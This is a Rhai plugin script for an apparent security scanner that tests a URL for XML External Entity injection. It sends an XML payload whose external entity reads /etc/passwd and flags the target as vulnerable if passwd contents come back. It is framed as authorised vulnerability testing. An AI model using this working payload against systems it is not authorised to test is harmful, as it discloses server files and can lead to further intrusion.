// check-xxe.rhai — operator/agent command `check.xxe { url }`: confirm in-band
// XML External Entity injection by POSTing an XML document whose external
// entity resolves a local file, then matching the file signature in the reply.
// OWASP A05 Misconfiguration / XXE.
//
// ACTIVE: one scope-/rate-gated POST, invoked only. The entity reads a universal
// marker file to prove resolution; it defines no recursive/expanding entities
// (no billion-laughs). For authorised testing only.
const NAME = "check-xxe";
const API  = "1";

fn load(reg) {
    reg.add_command("check.xxe", "Confirm in-band XXE at { url } (XML endpoint)", |args| {
        if type_of(args.url) != "string" { return "usage: check.xxe { url }"; }
        let tag = rand_text_alpha(5);
        let xml = `<?xml version="1.0"?>` +
                  `<!DOCTYPE ${tag} [<!ENTITY ${tag} SYSTEM "file:///etc/passwd">]>` +
                  `<${tag}>&${tag};</${tag}>`;
        let r = http.send(#{
            method: "POST",
            url: args.url,
            headers: #{ "Content-Type": "application/xml" },
            body: xml,
        });
        if r.status == () { return `no response from ${args.url}`; }
        if regex_match("root:.*:0:0:", r.body) {
            finding(#{
                name: "XML External Entity (XXE) injection",
                severity: "critical",
                flow_id: r.flow_id,
                detail: `${args.url} resolved an external entity and returned local file contents. XXE enables file disclosure and often SSRF.`,
                tags: ["xxe", "injection", "ssrf", "active", "owasp-a05"],
            });
            return "VULNERABLE: in-band XXE confirmed";
        }
        "no XXE confirmed (endpoint may not parse XML, or entities are disabled)"
    });
}
